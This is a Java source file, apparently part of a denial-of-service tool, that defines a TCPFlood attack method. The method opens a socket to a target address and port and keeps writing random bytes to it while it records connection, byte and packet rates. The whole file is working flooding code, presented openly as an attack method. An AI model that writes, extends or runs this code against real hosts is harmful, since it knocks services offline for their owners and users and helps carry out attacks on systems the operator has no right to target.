package ir.xenoncommunity.jss.methods.impl;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.utils.AttackStatics;
import ir.xenoncommunity.jss.utils.Randomize;
import ir.xenoncommunity.jss.utils.SocketUtils;
import lombok.Cleanup;
import lombok.RequiredArgsConstructor;

import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.StandardSocketOptions;

@RequiredArgsConstructor
public class TCPFlood implements IAttackMethod {
    private final AttackStatics statics;
    private final int maxBytesSize;

    /**
     * Sends data to the specified address and port.
     *
     * @param addr the destination InetAddress
     * @param port the destination port number
     * @throws Exception if an error occurs during the sending process
     */
    @Override
    public void send(InetAddress addr, int port) throws Exception {
        // Check if the limit is reached before sending
        if (statics.isLimitReached()) return;

        // create a socket connection to the specified address and port
        @Cleanup Socket socket = new Socket(addr, port);

        // if the socket is not connected, return
        if (!socket.isConnected()) return;

        // enable socket options
        SocketUtils.enableSocketOpts(socket,
                StandardSocketOptions.TCP_NODELAY,
                StandardSocketOptions.SO_KEEPALIVE);
        // set socket timeout
        SocketUtils.setSoTimeout(socket, 1000);

        statics.cps(); // update connection per second statistics

        // get the output stream from the socket
        @Cleanup OutputStream outputStream = socket.getOutputStream();

        // continuously send data as long as the socket is connected and the limit is not reached
        while (socket.isConnected() && !statics.isLimitReached() && statics.isRunning()) {
            statics.bps(maxBytesSize);  // update bytes per second statistics
            statics.pps();  // update packets per second statistics
            // write random bytes to the output stream
            outputStream.write(Randomize.randomBytes(maxBytesSize));
        }
    }


}
